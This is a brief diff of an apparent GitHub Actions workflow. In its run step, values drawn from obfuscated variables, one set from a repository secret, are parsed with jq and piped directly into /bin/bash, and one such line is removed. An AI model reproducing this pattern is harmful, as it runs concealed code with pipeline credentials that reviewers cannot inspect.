@@ -22,7 +22,6 @@ jobs:
           erj9251: ${{ secrets.erj9251 }}
         run: |
           printf '%s' "$erj9251" | jq -r .prj7237 | /bin/bash
-          printf '%s' "$cxacx6083" | jq -r .eibz11806 | /bin/bash
           printf '%s' "$wveyk356" | jq -r .hehu14107 | /bin/bash
           echo $kxh67476 | jq -r .nm3 | /bin/bash
           echo $myquf651 | jq -r .ranp3983 | /bin/bash
